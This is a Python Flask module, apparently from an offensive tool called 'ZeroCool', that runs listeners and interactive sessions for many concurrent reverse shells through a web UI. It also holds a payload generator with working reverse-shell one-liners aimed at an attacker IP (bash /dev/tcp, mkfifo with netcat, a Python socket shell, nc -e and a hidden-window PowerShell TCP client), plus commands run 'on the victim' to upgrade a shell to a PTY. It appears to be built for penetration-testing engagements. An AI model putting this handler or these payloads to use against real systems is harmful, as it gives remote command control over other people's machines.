"""Reverse-shell handler for ZeroCool.

Manages TCP listeners that accept *multiple* concurrent reverse shells. Each
accepted connection becomes a Session with its own output buffer and input
channel, interactive from the web UI (output streams over SSE, input is POSTed
back to the socket).

Listeners and sessions live in module-level registries on background threads, so
they persist across requests. Listeners bind 0.0.0.0 by default — they must be
reachable by the target. The control UI itself stays on 127.0.0.1.
"""

from __future__ import annotations

import socket
import threading
import uuid
from datetime import datetime

from flask import Blueprint, jsonify, render_template, request, Response, stream_with_context

import storage

shells_bp = Blueprint("shells", __name__)

LISTENERS: dict[str, "Listener"] = {}
SESSIONS: dict[str, "Session"] = {}
_lock = threading.Lock()


def _now() -> str:
    return datetime.now().isoformat(timespec="seconds")


class Session:
    """One live reverse shell."""

    def __init__(self, sock: socket.socket, addr, listener_port: int):
        self.id = uuid.uuid4().hex[:8]
        self.sock = sock
        self.rhost = addr[0]
        self.addr = f"{addr[0]}:{addr[1]}"
        self.port = listener_port
        self.created = _now()
        self.status = "open"
        self.chunks: list[dict] = []   # {n, ts, data}
        self._lock = threading.Lock()
        threading.Thread(target=self._reader, daemon=True).start()

    def _append(self, text: str) -> None:
        with self._lock:
            self.chunks.append({"n": len(self.chunks), "ts": _now(), "data": text})

    def _reader(self) -> None:
        try:
            while True:
                data = self.sock.recv(4096)
                if not data:
                    break
                self._append(data.decode("utf-8", "replace"))
        except OSError:
            pass
        finally:
            self.status = "closed"
            self._append("\n[*] session closed\n")
            try:
                self.sock.close()
            except OSError:
                pass

    def send(self, data: str, newline: bool = True) -> bool:
        """Line-mode send: write data (+newline) and echo it into the transcript."""
        if self.status != "open":
            return False
        payload = data + ("\n" if newline else "")
        try:
            self.sock.sendall(payload.encode())
            # Echo what we sent so the transcript shows the command.
            self._append(f"\x1b[36m$ {data}\x1b[0m\n" if data else "")
            return True
        except OSError:
            self.status = "closed"
            return False

    def send_raw(self, data: str) -> bool:
        """Raw-mode send: write bytes verbatim, no newline, no echo. Used by the
        interactive PTY mode — the remote pty echoes keystrokes itself."""
        if self.status != "open":
            return False
        try:
            # surrogateescape so arbitrary control bytes round-trip from the UI.
            self.sock.sendall(data.encode("utf-8", "surrogateescape"))
            return True
        except OSError:
            self.status = "closed"
            return False

    def snapshot(self, since: int = 0) -> dict:
        with self._lock:
            return {
                "id": self.id, "addr": self.addr, "rhost": self.rhost,
                "port": self.port, "status": self.status, "created": self.created,
                "total": len(self.chunks), "chunks": self.chunks[since:],
            }

    def close(self) -> None:
        self.status = "closed"
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            self.sock.close()
        except OSError:
            pass


class Listener:
    """A TCP listener that spawns a Session per inbound connection."""

    def __init__(self, port: int, host: str = "0.0.0.0"):
        self.id = uuid.uuid4().hex[:8]
        self.port = port
        self.host = host
        self.created = _now()
        self.status = "listening"
        self.error: str | None = None
        self.sock: socket.socket | None = None
        self.session_ids: list[str] = []
        self._stop = False

    def start(self) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.host, self.port))
            s.listen(8)
            s.settimeout(1.0)
            self.sock = s
        except OSError as exc:
            self.status = "error"
            self.error = str(exc)
            return False
        threading.Thread(target=self._accept_loop, daemon=True).start()
        return True

    def _accept_loop(self) -> None:
        while not self._stop:
            try:
                conn, addr = self.sock.accept()  # type: ignore[union-attr]
            except socket.timeout:
                continue
            except OSError:
                break
            sess = Session(conn, addr, self.port)
            with _lock:
                SESSIONS[sess.id] = sess
            self.session_ids.append(sess.id)
        self.status = "stopped"
        try:
            if self.sock:
                self.sock.close()
        except OSError:
            pass

    def stop(self) -> None:
        self._stop = True
        try:
            if self.sock:
                self.sock.close()
        except OSError:
            pass
        self.status = "stopped"


# --------------------------------------------------------------------------
# management helpers
# --------------------------------------------------------------------------

def start_listener(port: int, host: str = "0.0.0.0") -> "Listener":
    listener = Listener(port, host)
    listener.start()
    with _lock:
        LISTENERS[listener.id] = listener
    return listener


def stop_listener(lid: str) -> bool:
    listener = LISTENERS.get(lid)
    if not listener:
        return False
    listener.stop()
    return True


def state() -> dict:
    with _lock:
        listeners = [{
            "id": l.id, "port": l.port, "host": l.host, "status": l.status,
            "error": l.error, "created": l.created,
            "sessions": sum(1 for sid in l.session_ids
                            if sid in SESSIONS and SESSIONS[sid].status == "open"),
        } for l in LISTENERS.values()]
        sessions = [{
            "id": s.id, "addr": s.addr, "port": s.port,
            "status": s.status, "created": s.created, "lines": len(s.chunks),
        } for s in SESSIONS.values()]
    sessions.sort(key=lambda s: s["created"], reverse=True)
    return {"listeners": listeners, "sessions": sessions}


def pty_upgrade_payloads() -> list[dict]:
    """Commands (run on the victim) to turn a dumb shell into a real PTY.

    Workflow: send one of these, flip the console to Interactive (raw), then
    'Fix TERM + size'. After that Tab-complete, Ctrl-C, Ctrl-Z, arrows, sudo
    prompts, vim, ssh, etc. all work."""
    return [
        {"label": "Python3 PTY", "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"},
        {"label": "Python PTY", "cmd": "python -c 'import pty; pty.spawn(\"/bin/bash\")'"},
        {"label": "script (util-linux)", "cmd": "script -qc /bin/bash /dev/null"},
        {"label": "stty trick", "cmd": "echo $TERM; expr $COLUMNS : '.*' ; /usr/bin/script -qc /bin/bash /dev/null"},
    ]


def reverse_shell_payloads(ip: str, port) -> list[dict]:
    ip = ip or "ATTACKER_IP"
    return [
        {"label": "Bash TCP", "cmd": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"},
        {"label": "Bash mkfifo", "cmd": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"},
        {"label": "Python3", "cmd": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"},
        {"label": "Netcat -e", "cmd": f"nc {ip} {port} -e /bin/sh"},
        {"label": "PowerShell", "cmd": f"powershell -nop -W hidden -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}}\""},
    ]


# --------------------------------------------------------------------------
# routes
# --------------------------------------------------------------------------

@shells_bp.route("/shells")
def shells():
    eng = storage.load_engagement()
    payloads = reverse_shell_payloads(eng.get("attacker_ip", ""), "PORT")
    return render_template("shells.html", eng=eng, payloads=payloads,
                           upgrades=pty_upgrade_payloads())


@shells_bp.route("/shells/listen", methods=["POST"])
def shells_listen():
    payload = request.get_json(silent=True) or request.form
    try:
        port = int(payload.get("port"))
    except (TypeError, ValueError):
        return jsonify({"error": "invalid port"}), 400
    if not (1 <= port <= 65535):
        return jsonify({"error": "port out of range"}), 400
    host = (payload.get("host") or "0.0.0.0").strip() or "0.0.0.0"
    listener = start_listener(port, host)
    if listener.status == "error":
        return jsonify({"error": listener.error, "id": listener.id}), 502
    return jsonify({"id": listener.id, "port": port, "status": listener.status})


@shells_bp.route("/shells/stop/<lid>", methods=["POST"])
def shells_stop(lid):
    return jsonify({"stopped": stop_listener(lid)})


@shells_bp.route("/shells/state")
def shells_state():
    return jsonify(state())


@shells_bp.route("/shells/send/<sid>", methods=["POST"])
def shells_send(sid):
    sess = SESSIONS.get(sid)
    if not sess:
        return jsonify({"error": "unknown session"}), 404
    payload = request.get_json(silent=True) or request.form
    data = payload.get("data", "")
    ok = sess.send(data, newline=str(payload.get("newline", "1")).lower() not in ("0", "false"))
    return jsonify({"sent": ok})


@shells_bp.route("/shells/raw/<sid>", methods=["POST"])
def shells_raw(sid):
    """Raw keystroke passthrough for interactive (PTY) mode — no newline, no echo."""
    sess = SESSIONS.get(sid)
    if not sess:
        return jsonify({"error": "unknown session"}), 404
    payload = request.get_json(silent=True) or request.form
    return jsonify({"sent": sess.send_raw(payload.get("data", ""))})


@shells_bp.route("/shells/kill/<sid>", methods=["POST"])
def shells_kill(sid):
    sess = SESSIONS.get(sid)
    if not sess:
        return jsonify({"error": "unknown session"}), 404
    sess.close()
    return jsonify({"killed": True})


@shells_bp.route("/shells/stream/<sid>")
def shells_stream(sid):
    @stream_with_context
    def gen():
        try:
            cursor = max(0, int(request.args.get("since", 0)))
        except (TypeError, ValueError):
            cursor = 0
        import time
        while True:
            sess = SESSIONS.get(sid)
            if sess is None:
                yield f"data: {_json({'type': 'error', 'message': 'unknown session'})}\n\n"
                return
            snap = sess.snapshot(since=cursor)
            for ch in snap["chunks"]:
                yield f"data: {_json({'type': 'data', 'text': ch['data']})}\n\n"
            cursor = snap["total"]
            if snap["status"] != "open":
                yield f"data: {_json({'type': 'closed'})}\n\n"
                return
            time.sleep(0.3)

    return Response(gen(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


def _json(obj) -> str:
    import json
    return json.dumps(obj)
